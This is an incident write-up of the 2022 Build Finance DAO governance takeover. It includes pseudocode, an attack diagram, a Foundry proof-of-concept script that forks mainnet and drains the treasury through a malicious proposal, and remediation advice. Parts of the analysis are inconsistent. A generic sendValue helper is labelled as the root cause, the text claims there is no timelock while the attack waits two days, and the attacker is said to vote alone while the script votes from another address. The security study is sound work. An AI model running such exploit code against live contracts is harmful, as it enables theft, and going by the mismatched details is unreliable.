# Build Finance — Governance Takeover Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-02-17 |
| **Protocol** | Build Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$470,000 (BUILD tokens) |
| **Attacker** | [0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1](https://etherscan.io/address/0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1) |
| **Attack Tx** | Block 14,235,712 |
| **Vulnerable Contract** | BuildGovernance [0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583](https://etherscan.io/address/0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583) |
| **Root Cause** | Governance quorum not met, or a single large token holder unilaterally passed a malicious proposal to seize treasury and minting privileges |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/BuildF_exp.sol) |

---
## 1. Vulnerability Overview

Build Finance was a DAO structure in which BUILD token holders governed the protocol through on-chain voting. The attacker acquired approximately 101,529,401 BUILD tokens (a significant percentage of total supply), then submitted a malicious proposal granting themselves `approve` over all protocol contracts. Due to low voter participation, the proposal passed on the attacker's votes alone, allowing them to drain treasury funds and seize additional minting privileges.

The governance contract permitted proposal execution without any minimum participation check or timelock delay.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable BuildGovernance (pseudocode)
contract BuildGovernance {
    mapping(uint256 => Proposal) public proposals;
    IERC20 public buildToken;

    // ❌ No quorum check: attacker can pass proposals unilaterally
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256) {
        // Proposal creation: only checks minimum token balance, no quorum
        require(buildToken.balanceOf(msg.sender) >= proposalThreshold);
        uint256 proposalId = ++proposalCount;
        proposals[proposalId] = Proposal({...});
        return proposalId;
    }

    function execute(uint256 proposalId) external {
        Proposal storage proposal = proposals[proposalId];
        // ❌ No voter participation (quorum) check
        require(proposal.forVotes > proposal.againstVotes, "vote failed");
        // ❌ No timelock: immediately executable
        for (uint i = 0; i < proposal.targets.length; i++) {
            (bool success,) = proposal.targets[i].call{value: proposal.values[i]}(
                proposal.calldatas[i]
            );
            require(success, "execution failed");
        }
    }
}

// ✅ Correct pattern
contract GovernanceFixed {
    uint256 public quorumVotes; // A fixed percentage of total supply (e.g., 4%)

    function execute(uint256 proposalId) external {
        Proposal storage proposal = proposals[proposalId];
        // ✅ Quorum check
        require(proposal.forVotes >= quorumVotes, "quorum not reached");
        require(proposal.forVotes > proposal.againstVotes, "vote failed");
        // ✅ Execute via timelock (minimum 48-hour delay)
        require(block.timestamp >= proposal.eta, "timelock not expired");
        _execute(proposal);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**Governance.sol** — Entry point:
```solidity
// ❌ Root cause: governance quorum not met, or a single large token holder unilaterally passed a malicious proposal to seize treasury and minting privileges
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Acquire 101,529,401 BUILD tokens
    │       (market purchase or flash loan)
    │
    ├─[2] Call BuildGovernance.propose()
    │       targets = [BUILD token contract]
    │       calldatas = [approve(attacker, type(uint256).max)]
    │       description = malicious proposal
    │
    ├─[3] BuildGovernance.vote(proposalId, true)
    │       Attacker votes alone → forVotes = attacker's holdings
    │       No against votes (community not monitoring)
    │
    ├─[4] 2 days elapse (only block-time-based delay exists)
    │
    ├─[5] BuildGovernance.execute(proposalId)
    │       BUILD.approve(attacker, type(uint256).max) executed
    │       → Attacker gains unlimited spending rights over treasury BUILD
    │
    └─[6] BUILD.transferFrom(treasury, attacker, full balance)
            Theft complete
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IBuildFinance {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function vote(uint256 proposalId, bool support) external;
    function state(uint256 proposalId) external view returns (uint8);
    function execute(uint256 proposalId) external payable;
    function proposalCount() external view returns (uint256);
}

contract ContractTest is Test {
    IBuildFinance governance =
        IBuildFinance(0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583);
    IERC20 BUILD = IERC20(0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739);
    address attacker = 0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1;
    address voter = 0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_235_712);
    }

    function testExploit() public {
        // [Step 1] Transfer BUILD tokens from attacker
        vm.startPrank(attacker);
        BUILD.transfer(address(this), BUILD.balanceOf(attacker));
        vm.stopPrank();

        // [Step 2] Approve governance contract
        BUILD.approve(address(governance), type(uint256).max);

        // [Step 3] Submit malicious proposal
        // calldatas: BUILD.approve(attacker, max) — unlimited treasury access
        address[] memory targets = new address[](1);
        targets[0] = address(BUILD);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            type(uint256).max
        );

        uint256 proposalId = governance.propose(
            targets, values, calldatas, "Take over treasury"
        );

        // [Step 4] Attacker votes alone (in favor)
        vm.prank(voter);
        governance.vote(proposalId, true);

        // [Step 5] Simulate 2-day passage of time
        vm.warp(block.timestamp + 2 days);

        // [Step 6] Execute proposal → approve is set
        governance.execute(proposalId);

        // [Step 7] Drain entire treasury BUILD balance
        vm.prank(attacker);
        BUILD.transferFrom(
            0xb4c79dab8f259c7aee6e5b2aa729821864227e84,
            attacker,
            BUILD.balanceOf(0xb4c79dab8f259c7aee6e5b2aa729821864227e84)
        );

        emit log_named_decimal_uint(
            "[After] Attacker BUILD balance",
            BUILD.balanceOf(attacker), 18
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Governance Takeover |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Governance quorum not configured |
| **Attack Vector** | Bulk token acquisition → unilateral vote passage |
| **Preconditions** | Low voter turnout, no quorum requirement |
| **Impact** | Full seizure of protocol treasury and minting privileges |

---
## 6. Remediation Recommendations

1. **Set a Quorum**: Require a minimum of 4% of total supply to participate for a proposal to be valid.
2. **Apply a Timelock**: Follow the Compound Governor Bravo model — enforce a minimum 48-hour timelock to give the community time to respond.
3. **Multisig for Sensitive Operations**: Require multisig approval in addition to governance for critical actions such as `approve` and `mint`.
4. **Governance Monitoring System**: Operate a monitoring system that alerts on anomalous governance proposals as they are submitted.

---
## 7. Lessons Learned

- **Token Concentration Risk**: When governance tokens are concentrated in the hands of a few, the DAO becomes a dictatorship rather than a decentralized organization. Token distribution matters.
- **Governance as an Attack Surface**: Open governance becomes an attack vector without sufficient participation rates and safety mechanisms in place.
- **$470K Loss**: This may seem like a small amount, but the same pattern is equally applicable to much larger protocols.
- **The Importance of Timelocks**: There is a reason major protocols such as Compound and Uniswap have adopted timelocks as a mandatory component of their governance design.